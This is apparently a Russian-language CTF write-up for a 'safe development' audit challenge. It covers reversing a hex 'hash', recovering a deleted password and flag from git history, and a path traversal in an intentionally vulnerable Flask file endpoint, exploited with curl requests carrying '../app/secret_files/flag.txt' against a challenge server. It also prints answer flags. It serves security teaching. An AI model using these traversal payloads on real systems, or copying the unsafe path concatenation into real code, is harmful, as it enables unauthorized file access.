# Safe development
https://ctf.school/challenges

- [ Algo ](#algo)
- [ VCS ](#vcs)
- [ Files files files ](#files)

<a name="algo"></a>
## Algo
#### Унас новая задача. Провести проверку safe development. Заказчик предоставил архив с открытой частью разрабатываемого сайта. Для проверки своего алгоритма хеширования он предоставил хеш: 666с616776326467333264733233343274. Проверь алгоритм на возможность обратного преобразования.

Посмотрим, что у нас в архиве:
```bash
$ tree -a
.
├── Dockerfile
├── docker-compose.yml
└── src
    ├── .git
    │   ...
    │   └── refs
    │       ...
    │       └── tags
    ├── .gitignore
    ├── app.py
    ├── auth.py
    └── req.txt
```

В **auth.py** мы видим функцию, проверяющую пароль:
```python
import string
import binascii


allow_passwd = '71677a63362137387a7863626b6a31323366646764323334'


def check_password(password):
    if password == "" or password is None:
        return False
    vl = ''.join([hex(z)[2:] for z in [ord(x) for x in password]])
    return allow_passwd == vl 
```

Видим алгоритм хеширования, который и нужно проверить с помощью **666с616776326467333264733233343274**.

Напишем функцию, выполняющую обратные к **check_password** операции:
```python
def to_raw_password(hash: str) -> str:
    return ''.join(
        chr(int(hash[i:i+2], 16))
        for i in range(0, len(hash), 2)
    )
```

И применим её к хешу из условия задачи:
```python
print(to_raw_password('666c61677b32646733326473323334327d')) # flag{2dg32ds2342} 
```

Есть первый флаг - **flag{2dg32ds2342}**!.

<a name="vcs"></a>
## VCS
#### А не дал ли нам заказчик чего лишнего? В архиве содержится исходный код части сайта.

VCS, Version Control System - система управления версиями, программное обеспечение <br>
для облегчения работы с изменяющейся информацией. Система управления версиями позволяет хранить <br>
несколько версий одного и того же документа, при необходимости возвращаться к более ранним версиям, <br>
определять, кто и когда сделал то или иное изменение, и многое другое.

Мы видим, что заказчик в архиве передал нам **.git** - директорию, которую использует система контроля версий **git**.

Посмотрим процесс разработки процесса:
```bash
$ git log
commit 9c88cf0072d7ffe8d8f101f1cfeb62c74a25e06e (HEAD -> master)
    Finalize application

commit 1f0abc4883ddffccf0628d4767c4bddcdb043e80
    Fix .gitignore

commit f9d677900761726d33bc495a1fe745d4d3e02ef8
    Change gitignore

commit 2077603ae79db827b9fc1e25584ce149e547dc29
    Add  file render

commit 5074c88ab4448abf4d0e94e19652f924d3c27c39
    Prototyping 3

commit ef71498ccb36558d6f78627503db1ba61735e7c6
    Fix

commit 66d2f0624a0815e0b94f03f4f2e034b015a7e5fa
    Add app logic

commit 22c7cf88213f8b4bb1ccc780131c3cfd59316887
    Implement auth

commit 5765ee7264fe24ea97ebaa64ad270551319914c8
    Add gitignore

commit 11ac4b208ec2e04d51a7ca4ccf38c912bf3b0c80
    Add requirements

commit b3a34be352f35889540167c7ec958fbecae11782
    Prototyping 2

commit 8c32dbd7c15449629178f922fe236a3b2610fc49
    Prototyping 1

commit 31104079645f970b8cf659e1b04048f685dae85d
    Init
```

Давайте посмотрим, что это там разработчик фиксил?
```bash
$ git show 1f0abc4883ddffccf0628d4767c4bddcdb043e80
commit 1f0abc4883ddffccf0628d4767c4bddcdb043e80
Author: Developer <developer@localhost.de>
Date:   Tue Nov 26 19:17:23 2019 +0300

    Fix .gitignore

diff --git a/.gitignore b/.gitignore
index 6aaf2b5..ac24557 100644
--- a/.gitignore
+++ b/.gitignore
@@ -1,3 +1,4 @@
 py_env/
 __pycache__/
+secret_files/
 files/
```

Хм, **secret_files**, запомним, но пока неинтересно.

```bash
$ git show ef71498ccb36558d6f78627503db1ba61735e7c6
commit ef71498ccb36558d6f78627503db1ba61735e7c6
Author: Developer <developer@localhost.de>
Date:   Tue Nov 26 17:22:59 2019 +0300

    Fix

diff --git a/src/password.txt b/src/password.txt
deleted file mode 100644
index e77b3da..0000000
--- a/src/password.txt
+++ /dev/null
@@ -1,2 +0,0 @@
-qgzc6!78zxcbkj123fdgd234
-flag{22717297f6a3603608d260c9e5f69e0a}
```

Ага, когда-то был **password.txt**, содержащий какой-то пароль и второй флаг! - <br>
**flag{22717297f6a3603608d260c9e5f69e0a}**.

P.S. Также историю изменений удобно смотреть с помощью утилит **gitk** и **tig**.

<a name="files"></a>
## Files files files
#### Давай доводить аудит до конца. Ты тоже видишь эту уязвимость? Отлично. Значит достать секретный файл тебе не сложно. В архиве содержится исходный код части сайта.

Осталось найти последнюю уязвимость. Пройдёмся подробнее по файлам.

```bash
$ tree -a
.
├── Dockerfile
├── docker-compose.yml
└── src
    ├── .git
    ├── .gitignore
    ├── app.py
    ├── auth.py
    └── req.txt
```

**Dockerfile**
```dockerfile
FROM python:3.6
ENV PYTHONUNBUFFERED 1
RUN mkdir /files
ADD files /files
ADD /reqs.txt /tmp/req.txt
RUN pip install -r /tmp/req.txt
RUN mkdir /app;
COPY . /app
WORKDIR /app/src
CMD python app.py 0.0.0.0
```

Ничего необычного, копируем в Python-приложение файлы, устанавливаем зависимости, запускаем сервер.

**docker-compose.yml**
```yaml
version: "2"
services:
  web:
    build: .
    container_name: xc01
    volumes:
      - .:/src
    ports:
        - "8001:5000"
```

Сборка сервиса, проброс портов, примаунчивание текущей директории в **/src** контейнера - ого, вот это уже интересно!

У нас тут случаем не [File inclusion vulnerability](https://en.wikipedia.org/wiki/File_inclusion_vulnerability)? Смотрим дальше.

**src/.gitignore**
```text
py_env/
__pycache__/
secret_files/
files/
```

Система контроля версий игнорирует:
- виртуальное окружение;
- питонячий кеш;
- файлы, копируемые в приложение в **Dockerfile**;
- и **secret_files**, интересно!

**src/req.txt**
```text
Click==7.0
Flask==1.1.1
itsdangerous==1.1.0
Jinja2==2.10.3
MarkupSafe==1.1.1
Werkzeug==0.16.0
```

В зависимостях ничего интересное, видимо, приложение написано с использованием Flask.

**app.py**
```python
from flask import Flask, request

app = Flask(__name__)

from auth import check_password
import os

file_root = "/files/"


def get_file(filename):
    if os.path.exists(file_root + filename):
        f = open(file_root + filename, 'r').read()
        return f
    else:
        return None


@app.route('/')
def hello():
    return "Hello! Welcome to simple file sharing service. It is still in beta."


@app.route("/files")
def get_files():
    password = request.args.get('password')
    filename = request.args.get('filename')
    if (check_password(password)):
        if filename != "" and filename != None:
            fl = get_file(filename)
            if fl is None:
                return 'No files', 400
            else:
                return fl
        else:
            return 'No files', 400
    else:
        return 'No auth', 401


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8070)
```

Что мы видим:
- GET /files?password=<пароль>&filename=<имя файла> - получение файла
- Поиск файла происходит простой конкатенацией путей: `f = open(file_root + filename, 'r').read()`

Пароль случайно не тот, что мы ранее видели в коммите **Fix** - **qgzc6!78zxcbkj123fdgd234**?

**check_password** мы уже видели в **auth.py**:
```python
import string
import binascii


allow_passwd = '71677a63362137387a7863626b6a31323366646764323334'


def check_password(password):
    if password == "" or password is None:
        return False
    vl = ''.join([hex(z)[2:] for z in [ord(x) for x in password]])
    return allow_passwd == vl 
```

Внутри функции сравнение входящего пароля с **allow_passwd**...

Расхешируем его:
```python
print(to_raw_password('71677a63362137387a7863626b6a31323366646764323334'))  # qgzc6!78zxcbkj123fdgd234
```

Пароли совпали! Осталось найти флаг.

```bash
$ curl -X GET http://193.41.142.9:8002/files
No auth
```

Попробуем с паролем:
```bash
$ curl -X GET -G http://193.41.142.9:8002/files -d 'password=qgzc6!78zxcbkj123fdgd234' -d 'filename=flag'
No files
```

Мы помним, что судя по **.gitignore**, рядом с **files** лежат **secret_files**. <br>
А простая конкатенация в **get_file** поможет нам выйти из директории **files**.
```bash
$ curl -X GET -G http://193.41.142.9:8002/files -d 'password=qgzc6!78zxcbkj123fdgd234' -d 'filename=../app/secret_files/flag'
No files

$ curl -X GET -G http://193.41.142.9:8002/files -d 'password=qgzc6!78zxcbkj123fdgd234' -d 'filename=../app/secret_files/flag.txt'
flag{a0a7c3fff21f2aea3cfa1d0316dd816c}
```

А вот и наш флаг - **flag{a0a7c3fff21f2aea3cfa1d0316dd816c}**!

---

P.S. Уязвимость в **docker-compose.yml** не пригодилась :(

Но можно получить флаг и через неё (использовав **/src**):
```
$ curl -X GET -G http://193.41.142.9:8002/files -d 'password=qgzc6!78zxcbkj123fdgd234' -d 'filename=../src/secret_files/flag.txt'
flag{a0a7c3fff21f2aea3cfa1d0316dd816c}
```

---

**UPDATE** после завершения соревнования.

Разбор: https://youtu.be/5tt8xsAhYBI
